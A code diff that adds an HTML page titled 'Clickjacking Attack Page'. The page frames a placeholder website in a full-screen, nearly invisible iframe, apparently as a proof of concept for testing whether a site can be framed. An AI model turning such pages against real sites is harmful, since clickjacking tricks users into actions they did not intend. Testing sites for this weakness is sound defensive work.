@@ -1,0 +1,32 @@
+<!-- malicious.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Attack Page</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f2f2f2;
+        }
+        iframe {
+            opacity: 0.1; /* Make iframe barely visible */
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            pointer-events: none; /* Ignore pointer events on the iframe */
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://your-website.com" frameborder="0"></iframe>
+</body>
+</html>
